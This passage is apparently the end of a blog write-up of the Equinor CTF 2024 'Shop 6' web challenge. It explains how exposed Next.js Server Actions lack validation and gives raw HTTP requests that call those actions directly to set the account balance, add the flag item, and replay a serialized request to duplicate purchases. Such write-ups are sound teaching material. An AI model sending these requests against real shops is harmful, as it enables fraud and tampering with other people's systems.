      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">&#96;</span><span class="token string">/?error=Insufficient funds to buy </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>item<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">&#96;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">&#96;</span><span class="token string">/?login&amp;error=You need to login in order to buy </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>item<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">&#96;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
<span class="token operator">></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    Buy
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code><!-- HTML_TAG_END --></pre>
<p>This setup implies that once we buy an item we can afford, we could replay the same request, which would still pass the <code>user?.money &gt;= item.price</code> check. Each replayed request would trigger both the <code>addItem</code> and <code>setMoney</code> Server Actions, creating a desynchronization between the request state and the backend database state.</p>
<p>As a result, each request replay would add the item to our inventory again while setting the money back to a constant value, allowing us to bypass spending limits. This would enable us to buy the item multiple times without actually losing any more money than the first initial purchase:</p>
<pre class="language-ts"><!-- HTML_TAG_START --><code class="language-ts"><span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">addItem</span><span class="token punctuation">(</span>itemName<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">boolean</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> item <span class="token operator">=</span> db<span class="token punctuation">.</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT id FROM items WHERE name = ?'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>itemName<span class="token punctuation">)</span> <span class="token keyword">as</span> Item <span class="token operator">|</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>item<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO user_items (user_id, item_id) VALUES (?, ?)'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>user<span class="token punctuation">.</span>id<span class="token punctuation">,</span> item<span class="token punctuation">.</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">setMoney</span><span class="token punctuation">(</span>amount<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">boolean</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

  db<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token string">'UPDATE users SET money = ? WHERE id = ?'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>amount<span class="token punctuation">,</span> user<span class="token punctuation">.</span>id<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<h4 id="next-action-header"><a href="#next-action-header">Next-Action header</a></h4>
<p>Lastly, this is one of the more mysterious aspects of how Server Actions work, with very little documentation available on the internet aside from a few scattered examples found in Stack Overflow discussions, blogs, and articles. It seemed that this header is suppoed to be used under the hood in Next.js to trigger Server actions. For instance, you can take a look at this snippet from Next.js’ source code on how requests are parsed: <a href="https://github.com/vercel/next.js/blob/v14.2.15/packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts#L149" rel="noopener" class="text-link" target="_blank">https://github.com/vercel/next.js/blob/v14.2.15/packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts#L149</a>. But essentially, this means that any request to the server with the header Next-Action would trigger a specific Server Action based on the header’s value (Action ID).</p>
<p>However, in the context of the challenge application, there was one file we didn’t investigate during our initial analysis, the <code>middleware.ts</code> file. This file ensured that all requests containing the <code>Next-Action</code> header, which were not explicitly made by the server, are blocked. Specifically, responding with a 403 Forbidden status code:</p>
<pre class="language-ts"><!-- HTML_TAG_START --><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> NextRequest<span class="token punctuation">,</span> NextResponse <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'next/server'</span><span class="token punctuation">;</span>

<span class="token comment">// Make sure we are fully SSR complient and not using any client-side JS</span>
<span class="token keyword">export</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">middleware</span><span class="token punctuation">(</span>request<span class="token operator">:</span> NextRequest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'Next-Action'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">NextResponse</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> status<span class="token operator">:</span> <span class="token number">403</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">const</span> response <span class="token operator">=</span> NextResponse<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">)</span><span class="token operator">?.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'text/x-component'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">NextResponse</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> status<span class="token operator">:</span> <span class="token number">403</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token string">"script-src 'none';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> response<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  matcher<span class="token operator">:</span> <span class="token string">'/:path*'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code><!-- HTML_TAG_END --></pre>
<p>If there was no such middleware, one could have simply sent the following request to invoke a Server Action with arbitrary parameters (not that it really matters, since we could call the Server Actions using Forms and requests for bounded actions anyway):</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST / HTTP/2
Host: www.example.com
Content-Type: text/plain; charset=UTF-8
Next-Action: 5033aa9e8e719350ff01f9a353595d64a7488812
Content-Length: XXX

[1337]</code><!-- HTML_TAG_END --></pre>
<p>Great… So, what does all this mean for us? Essentially, as Next.js have kept on emphasizing throughout its documentation, <code>&quot;You should basically treat Server Actions as public HTTP endpoints.&quot;</code> This means validation is a must when working with Server Actions, as they’re accessible to clients and potentially vulnerable if mishandled. In the case of this challenge application, several unused Server Actions without proper validation were left exposed, making them accessible to all clients.</p>
<p>Now with all that said, much of the findings above were gathered after the CTF to deepen my understanding of how things work in Next.js under the hood.
During the competition how I got the first blood on the challenge, however, my approach was less structured. I mindlessly went havoc on the keyboard, my brains went brrr, and in combination with having a quick skim through the documentations, the flag just appeared…</p>
<h2 id="exploitation"><a href="#exploitation">Exploitation</a></h2>
<p>Cool, with the knowledge-sharing done! Let’s take a look at the exploitation now :)</p>
<p>We start by setting up a local instance, where the registration page is modified by uncommenting the code for the forms in order for us to register a user locally. By replaying the request against the live server using the same Action ID, we could register a user successfully.</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST / HTTP/2
Host: ikutoppene-XXXX-shop-6.ept.gg
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Length: 472

------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_ID_22848b167831802fadcb34db9cc648e9d77b665f&quot;


------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;username&quot;

shirajuki
------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;password1&quot;

asdzxc123
------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;password2&quot;

asdzxc123
------WebKitFormBoundaryQApJRAsTKClOX1Fa--</code><!-- HTML_TAG_END --></pre>
<p>Now, with all the things we’ve gone through to understand how Server Actions work, we should have at least 3 paths to get the flag.</p>
<h3 id="path-1---rosebud-kaching-and-motherlode"><a href="#path-1---rosebud-kaching-and-motherlode">Path 1 - Rosebud, kaching and motherlode</a></h3>
<p>We could send a request usually used with bounded actions to arbitrarily set our balance to any desired value, effectively bypassing any intended limitations. With our balance set sufficiently high, we could then simply purchase the EPT Tote Bag that contains the flag, completing the challenge without needing any additional exploits.</p>
<p>In the request shown below, we basically call <code>setMoney.bind(null, 9001)()</code>.</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST /items HTTP/2
Host: ikutoppene-XXXX-shop-6.ept.gg
Cookie: token=344e1360bd35ec2f26fcf058950d27d6
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Length: 409

------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_REF_2&quot;


------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_2:0&quot;

&#123;&quot;id&quot;:&quot;5033aa9e8e719350ff01f9a353595d64a7488812&quot;,&quot;bound&quot;:&quot;$@1&quot;&#125;
------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_2:1&quot;

[9001]
------WebKitFormBoundaryQApJRAsTKClOX1Fa--
</code><!-- HTML_TAG_END --></pre>
<h3 id="path-2---ept-tote-bag-directly-in-my-bag"><a href="#path-2---ept-tote-bag-directly-in-my-bag">Path 2 - EPT Tote Bag directly in my bag</a></h3>
<p>Similarily, an even easier way is to just simply add the EPT Tote Bag containing the flag, directly to our inventory.</p>
<p>In the request shown below, we basically call <code>addItem.bind(null, &quot;EPT Tote Bag&quot;)()</code>.</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST /items HTTP/2
Host: ikutoppene-XXXX-shop-6.ept.gg
Cookie: token=344e1360bd35ec2f26fcf058950d27d6
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Length: 421


------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_REF_2&quot;


------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_2:0&quot;

&#123;&quot;id&quot;:&quot;240aa4f8f6a6e8c0edfbc1f6b473afaa2164e7b7&quot;,&quot;bound&quot;:&quot;$@1&quot;&#125;
------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_2:1&quot;

[&quot;EPT Tote Bag&quot;]
------WebKitFormBoundaryQApJRAsTKClOX1Fa--</code><!-- HTML_TAG_END --></pre>
<h3 id="path-3---state-desynchronization-through-closures"><a href="#path-3---state-desynchronization-through-closures">Path 3 - State desynchronization through closures</a></h3>
<p>Unfortunately, I did not know of the method of binding Server Actions as shown in the exploits and requests above. Instead, I focused on exploiting the buy/sell functionality after successfully registering a user and setting the user’s retailer role.</p>
<p>In the request shown below, we basically call <code>makeRetailer()</code>.</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST / HTTP/2
Host: ikutoppene-XXXX-shop-6.ept.gg
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Length: 182

------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_ID_758c88ac2c11c3f9c5eac5df2912014fc02de432&quot;


------WebKitFormBoundaryQApJRAsTKClOX1Fa--</code><!-- HTML_TAG_END --></pre>
<p>After that, with the idea of closures we had discussed above about how the state is serialized and saved in the requests itself. We can buy the <code>Fun</code> item and then replay the same request at least 26 times for the necessary items we could resell.</p>
<pre class="language-undefined"><!-- HTML_TAG_START --><code class="language-undefined">POST / HTTP/2
Host: ikutoppene-XXXX-shop-6.ept.gg
Cookie: token=344e1360bd35ec2f26fcf058950d27d6
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Length: 858

------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_REF_2&quot;


------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_2:1&quot;

[&quot;$@2&quot;]
------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_2:0&quot;

&#123;&quot;id&quot;:&quot;9337c109f875b15e8546173b9d015d3123b9728c&quot;,&quot;bound&quot;:&quot;$@1&quot;&#125;
------WebKitFormBoundaryQApJRAsTKClOX1Fa
Content-Disposition: form-data; name=&quot;$ACTION_2:2&quot;

&quot;12wBRqePUMo/+f7x2mV3ihIJ/a6k5k2B5z0VTQHt8UrAYMwwV7iMngSRK4SQHC7nEGRqFCnIJj+SqqENKz0AD1g9mMP2p4vIXU7vZLhYws4en88FdxAMLfSlAtRofz5prCbpfUVKUoMsYV78AA3y5YoIIjr5NmelPAfl1FD6DLx+zWwjy39McbcH9ON8+OdUbijPVKDHz/fHABeGz1yVV5zBOSpJKwZcnPaAXGs16DaiD3rH9IkgabM34v0OI80hlp+E4wapntsDJbcHF8ZRfrPWglO2AJ5IXmqnRkybPPCQF9wezVgW3JDbcPejHcAU4MuGOLUnrisTPM6jpt3GPGPbyLM=&quot;
------WebKitFormBoundaryQApJRAsTKClOX1Fa--</code><!-- HTML_TAG_END --></pre>
<p>With this, we should have lots of the <code>Fun</code> items added to our inventory. Manually selling each and every item should give us enough balance for the EPT Tote Bag.</p>
<p><strong>Boom, flag!</strong> <code>EPT{3v3ry7hin6_i5_4_5erv3r_4cti0n_1f_y0u_7ry_h4rd_en0ugh!}</code></p>
<p><img src="https://raw.githubusercontent.com/Shirajuki/equinor-ctf-2024/refs/heads/main/writeups/web/Shop%206/Iku-toppene/assets/4-flag.png" alt="flag"></p>
<h1 id="conclusion"><a href="#conclusion">Conclusion</a></h1>
<p>To wrap up this write-up, I would like to thank my teammates at Iku-toppene for the great teamwork during the CTF. Solving this challenge was definitely a team effort alongside my bigshot teammate, olefredrik, and not something I had done just alone. Additionally, I would like to express my greatest appreciation to the Equinor Pwn Team (EPT) for hosting such an amazing CTF and for the high-quality challenges. Finally, a special thanks to the people who reached out after the CTF and started discussions with me, this greatly encouraged me to further explore and piece together the findings shared above.</p>
<p>Thank you for reading!</p>
<p>Oh, and by the way… here’s a video of the Fire 🔥 announcement for getting first blood on this challenge during the CTF 😎</p>
<p><a href="https://github.com/user-attachments/assets/51e44009-2048-4251-b7de-fa1ec84d66fc" rel="noopener" class="text-link" target="_blank">https://github.com/user-attachments/assets/51e44009-2048-4251-b7de-fa1ec84d66fc</a></p>
</div>
</section></main>

<footer class="svelte-13k2m7z"><p>Loosely designed in Figma by Shirajuki.<br>Built with SvelteKit and SCSS</p>
</footer>


		<script type="module" data-sveltekit-hydrate="idz4xa">
		import { set_public_env, start } from "/_app/immutable/start-d5519fbe.js";

		set_public_env({});

		start({
			target: document.querySelector('[data-sveltekit-hydrate="idz4xa"]').parentNode,
			paths: {"base":"","assets":""},
			session: {},
			route: true,
			spa: false,
			trailing_slash: "never",
			hydrate: {
				status: 200,
				error: null,
				nodes: [0, 6],
				params: {},
				routeId: "blog/equinor-ctf-2024-shop-6"
			}
		});
	</script></div>
  </body>
</html>
